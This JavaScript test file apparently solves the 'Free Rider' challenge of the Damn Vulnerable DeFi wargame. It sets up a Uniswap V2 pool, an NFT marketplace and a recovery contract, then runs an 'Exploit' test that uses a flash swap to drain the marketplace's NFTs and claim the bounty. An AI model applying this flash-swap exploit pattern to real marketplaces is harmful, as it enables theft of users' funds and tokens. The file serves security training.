const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");
const factoryUniswapV2ABI = require("@uniswap/v2-core/build/IUniswapV2Factory.json").abi;
const routerUniswapV2ABI = require("@uniswap/v2-periphery/build/UniswapV2Router02.json").abi;
const UniswapV2PairABI = require("@uniswap/v2-core/build/IUniswapV2Pair.json").abi;
const WETH_ABI = require("@uniswap/v2-periphery/build/WETH9.json").abi;
const NFT_ABI = require("C:/Users/Danilo Gigli/Desktop/Solidity/Twitter/TwitterPost/artifacts/contracts/DamnVulnerableDefiChallenges/DamnValuableBase/DamnValuableNFT.sol/DamnValuableNFT.json").abi;


describe("FreeRider Damn Vulnerable DEFI", function(){


    let owner, hacker,
        Marketplace, marketplace,
        FreeRiderRecovery, recovery,
        DVT, dvt,
        dvtNFT,
        FreeRiderAttack, attacker;


    let wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    let uniswapFactoryAddress = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
    let uniswapRouterAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    let uniswapFactory;
    let uniswapRouter;
    let uniswapPair;
    let WETH;


    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();


        //Deploy DamnValuableToken

        DVT = await ethers.getContractFactory("DamnValuableToken");
        dvt = await DVT.deploy();
        await dvt.deployed();



        uniswapFactory = await ethers.getContractAt(factoryUniswapV2ABI, uniswapFactoryAddress, owner);
        uniswapRouter = await ethers.getContractAt(routerUniswapV2ABI, uniswapRouterAddress, owner);



        //Create WETH/DVT Pool on UniswapV2
        await uniswapFactory.createPair(wethAddress, dvt.address);


        //Get Pair Address
        let pairAddress = await uniswapFactory.getPair(wethAddress, dvt.address);
        console.log("WETH/DVT Pair Address:", pairAddress);
        console.log("");


        //Get contract Pair
        uniswapPair = await ethers.getContractAt(UniswapV2PairABI, pairAddress, owner);


        //Approve DVT Tokens to Fill the Pool
        await dvt.approve(uniswapRouter.address, ethers.utils.parseEther("100"));


        
        ////Add Liquidity to the pair 100 WETH / 100 DVT Tokens
        await uniswapRouter.addLiquidityETH(
            dvt.address,
            ethers.utils.parseEther("100"),
            ethers.utils.parseEther("100"),
            ethers.utils.parseEther("100"),
            owner.address,
            (await ethers.provider.getBlock("latest")).timestamp * 2,
            {value: ethers.utils.parseEther("100")}
        );


        // Get Reserves Of The Pair
        let [reserveDVT, reserveWETH] =await uniswapPair.getReserves()
        console.log("Reserve DVT:", (reserveDVT/10**18).toString(), "DVT");
        console.log("Reserve WETH:", (reserveWETH/10**18).toString(), "WETH");
        console.log("");


        //Deploy MarketPlace
        Marketplace = await ethers.getContractFactory("FreeRiderNFTMarketplace");
        marketplace = await Marketplace.deploy(6);
        await marketplace.deployed();


        //Get NFT Contract
        let NFTContractAddress = await marketplace.token();
        dvtNFT = await ethers.getContractAt(NFT_ABI, NFTContractAddress, owner);


        //Check NFT Owner Balance
        let nftOwnerBalance = await dvtNFT.balanceOf(owner.address);
        console.log("NFT Owner Balance:", nftOwnerBalance.toString());
        console.log("");

        //Price per NFT
        let offerAmount = ethers.utils.parseEther("15");

        //Minted ID NFT Token
        let tokenIds = [0,1,2,3,4,5];

        //Approve Marketplace
        for(let i = 0; i < tokenIds.length; i++){
            await dvtNFT.approve(marketplace.address, tokenIds[i]);
        }



        //Owner offer tokens to marketplace
        await marketplace.offerMany(
            [0,1,2,3,4,5],
            [offerAmount, offerAmount, offerAmount, offerAmount, offerAmount, offerAmount]
        );


        //WETH Contract
        WETH = await ethers.getContractAt(WETH_ABI, wethAddress, owner);



        //Deploy FreeRiderRecovery Contract and send 45 ether
        FreeRiderRecovery = await ethers.getContractFactory("FreeRiderRecovery");
        recovery = await FreeRiderRecovery.deploy(hacker.address, dvtNFT.address, {value: ethers.utils.parseEther("45")});
        await recovery.deployed();



        //Deploy Attacker Contract
        FreeRiderAttack = await ethers.getContractFactory("FreeRiderAttack");
        attacker = await FreeRiderAttack.connect(hacker).deploy(
            marketplace.address,
            pairAddress,
            dvt.address,
            recovery.address,
            dvtNFT.address
        );

        await attacker.deployed();
    });




    // Hacker start 1 ETH
    it("Exploit",async()=> {

        //Exploit with 1 Ether
        await hacker.sendTransaction({to: attacker.address, value: ethers.utils.parseEther("1")});

        //Check Attacker Contract balance before exploit
        let attackerETHAmountBeforeExploit = await ethers.provider.getBalance(attacker.address);
        console.log("ETH Balance Attacker contract Before Exploit", (attackerETHAmountBeforeExploit/10**18).toString(), "ETH")
        console.log("");

        //Check Attacker Contract NFT balance before exploit
        let attackerContractNFTBalance = await dvtNFT.balanceOf(attacker.address);
        console.log("Attacker Contract NFT Balance", attackerContractNFTBalance.toString());
        console.log("");


        //Check Marketplace Contract NFT balance before exploit
        let marketplaceContractNFTBalance = await dvtNFT.balanceOf(marketplace.address);
        console.log("Marketplace Contract NFT Balance", marketplaceContractNFTBalance.toString());
        console.log("");



        console.log("---------- After EXPLOIT --------------");
        console.log("");

        //Call Flashswaps from UniswapV2 Pool and get WETH
        await attacker.connect(hacker).callLoan(ethers.utils.parseEther("90"));


        //Check Attacker Contract NFT balance after exploit
        let attackerContractNFTBalanceAfterExploit = await dvtNFT.balanceOf(attacker.address);
        console.log("Attacker Contract NFT Balance", attackerContractNFTBalanceAfterExploit.toString());
        console.log("");


        //Check Marketplace Contract NFT balance after exploit
        let marketplaceContractNFTBalanceAfterExploit = await dvtNFT.balanceOf(marketplace.address);
        console.log("Marketplace Contract NFT Balance", marketplaceContractNFTBalanceAfterExploit.toString());
        console.log("");


        //Check Attacker Contract ETH balance after exploit
        let attackerETHAmountAfterExploit = await ethers.provider.getBalance(attacker.address);
        console.log("ETH Balance Attacker contract After Exploit", (attackerETHAmountAfterExploit/10**18).toString(), "ETH");
        console.log("");


        //Check AAmount spent form attacker Contract to perform Exploit
        let amountSpent = attackerETHAmountBeforeExploit - attackerETHAmountAfterExploit;
        console.log("Amount Spent:", (amountSpent/10**18).toString(), "ETH");
        console.log("");


        //Check hacker ETH balance before recovery 45 ether as pot
        let hackerETHAmountBeforeRecovery = await ethers.provider.getBalance(hacker.address);
        console.log("ETH Balance Hacker Before Recovery", (hackerETHAmountBeforeRecovery/10**18).toString(), "ETH")
        console.log("");


        await attacker.connect(hacker).transferToRecovery();


        //Check hacker ETH balance after recovery 45 ether as pot
        let hackerETHAmountAfterRecovery = await ethers.provider.getBalance(hacker.address);
        console.log("ETH Balance Hacker After Recovery", (hackerETHAmountAfterRecovery/10**18).toString(), "ETH")
        console.log("");
    });
})